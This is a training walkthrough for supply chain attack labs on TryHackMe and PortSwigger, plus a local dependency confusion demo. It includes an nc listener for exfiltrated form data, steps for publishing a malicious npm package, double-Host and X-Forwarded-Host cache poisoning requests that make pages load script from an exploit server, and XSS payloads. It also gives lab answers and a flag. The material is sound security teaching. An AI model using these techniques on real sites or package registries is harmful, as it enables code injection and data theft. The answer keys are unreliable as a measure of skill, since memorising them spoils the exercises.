# Supply Chain Attack Labs -- Step-by-Step Walkthrough Guide

## Table of Contents

1. [Lab 1: TryHackMe -- Supply Chain Attack: Lottie](#lab-1-tryhackme----supply-chain-attack-lottie)
2. [Lab 2: PortSwigger -- Web Cache Poisoning via Ambiguous Requests](#lab-2-portswigger----web-cache-poisoning-via-ambiguous-requests)
3. [Lab 3: PortSwigger -- Web Cache Poisoning to Exploit DOM Vulnerability](#lab-3-portswigger----web-cache-poisoning-to-exploit-dom-vulnerability)
4. [Lab 4: Local Demo -- Dependency Confusion](#lab-4-local-demo----dependency-confusion)
5. [Lab 5: Supply Chain Attack Simulator (14 Scenarios)](#lab-5-supply-chain-attack-simulator)

---

## Lab 1: TryHackMe -- Supply Chain Attack: Lottie

**URL:** https://tryhackme.com/room/supplychainattacks
**Difficulty:** Easy
**Time:** ~60 minutes
**Cost:** FREE
**Prerequisites:** TryHackMe account, OpenVPN or AttackBox

### Background

This lab is based on the real-world Lottie Player supply chain attack (October 2024).
Attackers compromised a maintainer's npm token and published malicious versions of the
`@lottiefiles/lottie-player` package that injected a cryptocurrency wallet drainer.

### Task 1: Introduction

Read the introduction about supply chain attacks. Understand the concept:
- Third-party libraries are trusted by default
- Compromising one library affects all applications using it
- npm packages use lifecycle hooks that can execute arbitrary code

### Task 2: Lottie Player Supply Chain Attack

This task covers the real-world Lottie attack.

**Key Information:**
- Lottie Player is used for rendering animations on web pages
- The attacker stole an npm maintainer's access token
- Malicious versions injected a Web3 wallet connection prompt
- Connected wallets were drained of cryptocurrency

**Answers:**

| Question | Answer |
|----------|--------|
| What is the vulnerable version of the Lottie Player? | `2.0.5` |
| What is the C2 server (defanged)? | `castleservices01[.]com` |

### Task 3: How to Exploit

This is the hands-on practical task. You'll work with a simulated npm registry
(`npm.thm`) and publish a malicious package.

**Step-by-Step Walkthrough:**

#### Step 3.1: Start the Machine

- Click "Start Machine" at the top of the task
- If using OpenVPN, connect to TryHackMe's VPN
- If using AttackBox, launch it

#### Step 3.2: Explore the Environment

Once the machine is running:

```bash
# Check what's available on the target
# The machine runs a simulated npm registry and web application
```

#### Step 3.3: Examine the Target Application

The target web application uses a form validator package from the local npm registry.
Your goal is to publish a malicious version of this package.

- Find the form validator JavaScript file: `form-validator.bundle.js`
- Examine how the application loads and uses this package

#### Step 3.4: Create the Malicious Package

Modify the form validator package to exfiltrate form data:

```javascript
// The malicious version should:
// 1. Still function as a form validator (stealth)
// 2. Additionally capture form submissions
// 3. Send captured data to your listener on port 9090
```

#### Step 3.5: Publish the Malicious Package

```bash
# Publish your malicious version as v1.1.0 to the local npm registry
npm publish --registry http://npm.thm
```

#### Step 3.6: Set Up Your Listener

```bash
# Listen for exfiltrated data on port 9090
nc -lvnp 9090
```

#### Step 3.7: Trigger the Attack

- Visit the web application
- Submit a form
- Check your listener for the exfiltrated data

**Answers:**

| Question | Answer |
|----------|--------|
| Attacker's updated package version on npm.thm | `1.1.0` |
| Port number for receiving data | `9090` |
| Form validator JS file name | `form-validator.bundle.js` |
| Flag after uploading package v1.1.0 | `THM{MALICIOUS_PACKAGE_UPLOADED007}` |

### Key Takeaways from This Lab

1. npm tokens are the keys to the kingdom -- protect them with MFA
2. Lifecycle hooks execute code automatically -- no user interaction needed
3. Malicious packages can maintain normal functionality while exfiltrating data
4. Version resolution can be exploited to deliver malicious updates

---

## Lab 2: PortSwigger -- Web Cache Poisoning via Ambiguous Requests

**URL:** https://portswigger.net/web-security/host-header/exploiting/lab-host-header-web-cache-poisoning-via-ambiguous-requests
**Difficulty:** Practitioner
**Time:** ~30 minutes
**Prerequisites:** PortSwigger account, Burp Suite (Community Edition is fine)

### Supply Chain Connection

This lab demonstrates the **distribution layer** of a supply chain attack. By poisoning
a web cache, you force ALL users to load malicious JavaScript from your server instead
of the legitimate source. This is conceptually identical to how a compromised CDN or
poisoned npm package delivers malicious code to all consumers.

### Step-by-Step Walkthrough

#### Step 1: Access the Lab

1. Log into PortSwigger Web Security Academy
2. Navigate to the lab and click "Access the lab"
3. You'll get a lab URL like: `https://0a1234567890.web-security-academy.net/`
4. Note your exploit server URL (available in the lab interface)

#### Step 2: Explore the Application

1. Visit the lab homepage in your browser
2. Open Burp Suite and configure your browser to proxy through it
3. In Burp, look at the HTTP response for the homepage
4. Notice the application loads a JavaScript file:

```html
<script src="/resources/js/tracking.js"></script>
```

This `tracking.js` is loaded from the same host. If we can make the cache serve a
version that loads from OUR server, we achieve a supply chain compromise.

#### Step 3: Identify the Cache Behavior

1. Send the homepage request to Burp Repeater
2. Send the request a few times and observe the `X-Cache` header:
   - `X-Cache: miss` -- response was fetched from the origin
   - `X-Cache: hit` -- response was served from cache

The cache key is based on the request path and the Host header.

#### Step 4: Find the Ambiguity

1. In Burp Repeater, add a **second Host header** to the request:

```http
GET / HTTP/2
Host: 0a1234567890.web-security-academy.net
Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

2. Send the request
3. Observe the response -- the `<script>` tag now references your exploit server:

```html
<script src="//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/resources/js/tracking.js"></script>
```

**Why this works:**
- The **cache** uses the FIRST Host header as the cache key
- The **backend** uses the SECOND Host header to generate the page
- Result: the page is cached with the legitimate key but contains the attacker's host

#### Step 5: Prepare the Exploit Server

1. Go to your exploit server in the lab
2. Set the file path to: `/resources/js/tracking.js`
3. Set the body to:

```javascript
alert(document.cookie)
```

4. Click "Store"

#### Step 6: Poison the Cache

1. Go back to Burp Repeater
2. Send the request with the double Host header
3. Keep sending until you get `X-Cache: miss` followed by `X-Cache: hit`
4. When you see `hit`, the poisoned response is now cached

#### Step 7: Verify the Attack

1. Open a new browser tab (or incognito window)
2. Visit the lab homepage normally (no Burp, no double headers)
3. The cached response loads `tracking.js` from YOUR exploit server
4. `alert(document.cookie)` executes -- lab is solved!

### Why This Matters for Supply Chain

In the real world, this attack pattern means:
- An attacker can replace **any JavaScript file** served through a vulnerable cache
- Every user visiting the page gets the **attacker's JavaScript**
- The attack persists for the **duration of the cache TTL**
- This is identical to compromising a CDN that serves JavaScript libraries

---

## Lab 3: PortSwigger -- Web Cache Poisoning to Exploit DOM Vulnerability

**URL:** https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-to-exploit-a-dom-vulnerability-via-a-cache-with-strict-cacheability-criteria
**Difficulty:** Expert
**Time:** ~45 minutes
**Prerequisites:** PortSwigger account, Burp Suite with Param Miner extension

### Supply Chain Connection

This lab shows how manipulating the **source of JavaScript data** (similar to a CDN or
API endpoint) can inject malicious content into a page's DOM, affecting all users who
receive the cached version.

### Step-by-Step Walkthrough

#### Step 1: Discover Unkeyed Headers

1. Access the lab and proxy traffic through Burp Suite
2. Install the **Param Miner** extension from the BApp Store (if not already installed)
3. Right-click on the homepage request in Burp and select:
   - Extensions > Param Miner > Guess headers
4. Param Miner will discover that `X-Forwarded-Host` is an **unkeyed input**
   (it affects the response but is NOT part of the cache key)

#### Step 2: Analyze the Vulnerable Code

1. Look at the page source/response
2. Find the script that uses the `X-Forwarded-Host` value:

```javascript
// The page loads data from a JSON endpoint
// The host for this endpoint is controlled by X-Forwarded-Host
initGeoLocate('//' + data.host + '/resources/json/geolocate.json');
```

When you set `X-Forwarded-Host: attacker.com`, the page tries to load:
`//attacker.com/resources/json/geolocate.json`

#### Step 3: Create a Malicious JSON Response

1. On your exploit server, set the file path to: `/resources/json/geolocate.json`
2. Set the Content-Type header to: `application/json`
3. Add the header: `Access-Control-Allow-Origin: *`
4. Set the body to:

```json
{
    "country": "<img src=x onerror=alert(document.cookie)>"
}
```

5. Click "Store"

#### Step 4: Poison the Cache

1. In Burp Repeater, add the unkeyed header:

```http
GET / HTTP/2
Host: LAB-ID.web-security-academy.net
X-Forwarded-Host: YOUR-EXPLOIT-SERVER.exploit-server.net
```

2. Send the request repeatedly until the response is cached
3. The cached page now loads JSON from your exploit server
4. The `country` field with XSS payload gets inserted into the DOM

#### Step 5: Solve the Lab

1. Visit the homepage normally in a browser
2. The cached response triggers the DOM-based XSS
3. `alert(document.cookie)` fires -- lab solved!

### Key Takeaway

The `X-Forwarded-Host` header manipulated which server the page loaded data from.
This is analogous to a supply chain attack where the **data source** (CDN, API,
package registry) is compromised, and all consumers receive tainted content.

---

## Lab 4: Local Demo -- Dependency Confusion

**Location:** `../demos/dependency-confusion/`
**Difficulty:** Easy
**Time:** ~15 minutes
**Prerequisites:** Node.js 16+, npm

See the [Dependency Confusion README](../demos/dependency-confusion/README.md) for
full step-by-step instructions.

### Quick Summary

```bash
# 1. Install and start local npm registry
npm install -g verdaccio
verdaccio &

# 2. Create user
npm adduser --registry http://localhost:4873

# 3. Publish legitimate package (v1.2.3)
cd demos/dependency-confusion/private-package
npm publish --registry http://localhost:4873

# 4. Publish malicious package (v99.0.0)
cd ../malicious-package
npm publish --registry http://localhost:4873

# 5. Install in victim app -- observe the confusion!
cd ../victim-app
npm install --registry http://localhost:4873
# => Installs v99.0.0 (malicious!) instead of v1.2.3

# 6. Run the victim app
node app.js
# => Output shows the MALICIOUS version was loaded
```

---

## Lab 5: Supply Chain Attack Simulator

**Not bundled in this repo.** Clone the simulator separately (see `.gitignore` — the directory is optional). If you do not have it, skip this lab or assign it as follow-up reading.

**Location (after clone):** `../supply-chain-attack-simulator/`
**Difficulty:** Varies (Easy to Hard)
**Time:** 2-4 hours for all 14 scenarios
**Prerequisites:** Python 3.8+, Node.js 16+, Git, Docker (optional)

### Available Scenarios

| # | Scenario | Difficulty | Time |
|---|----------|-----------|------|
| 1 | Typosquatting | Easy | 10 min |
| 2 | Dependency Confusion | Easy | 15 min |
| 3 | Compromised Packages | Medium | 15 min |
| 4 | Malicious Updates | Medium | 15 min |
| 5 | Build System Compromise | Medium | 20 min |
| 6 | Self-Replicating Attacks | Hard | 20 min |
| 7 | Transitive Dependencies | Medium | 15 min |
| 8 | Package Lock Manipulation | Medium | 15 min |
| 9 | Package Signing Bypass | Hard | 20 min |
| 10 | Git Submodule Attacks | Medium | 15 min |
| 11 | Registry Mirror Poisoning | Hard | 20 min |
| 12 | Workspace/Monorepo Attacks | Medium | 15 min |
| 13 | Package Metadata Manipulation | Medium | 15 min |
| 14 | Container Image Supply Chain | Hard | 20 min |

### Quick Start

```bash
cd supply-chain-attack-simulator
pip install -r requirements.txt
python main.py
```

Follow the interactive menu to select and run scenarios.

### Recommended Scenarios for the Session

For a 90-minute session, focus on these 4 scenarios:
1. **Scenario 1: Typosquatting** -- easiest, great intro
2. **Scenario 2: Dependency Confusion** -- core concept, matches the local demo
3. **Scenario 5: Build System Compromise** -- matches SolarWinds case study
4. **Scenario 3: Compromised Packages** -- matches Lottie/event-stream case studies

---

## Lab Preparation Checklist

### Before the Session

- [ ] Create a TryHackMe account at https://tryhackme.com
- [ ] Install OpenVPN (or plan to use AttackBox)
- [ ] Start the TryHackMe "Supply Chain Attack: Lottie" room
- [ ] Create a PortSwigger account at https://portswigger.net/web-security
- [ ] Install Burp Suite Community Edition
- [ ] Install the Param Miner extension in Burp Suite
- [ ] Install Verdaccio: `npm install -g verdaccio`
- [ ] Test the local dependency confusion demo
- [ ] Install Python 3.8+ and run `pip install -r requirements.txt` in the simulator
- [ ] Test the simulator: `python main.py`

### During the Session

1. Start with the **malicious postinstall demo** (5 min) -- immediate visual impact
2. Run the **dependency confusion demo** (10 min) -- explains the core concept
3. Do the **TryHackMe Lottie room** (30-40 min) -- full hands-on experience
4. If time permits, do **PortSwigger cache poisoning** (20 min) -- advanced concept
5. If time permits, run **simulator scenarios** (15 min) -- additional practice
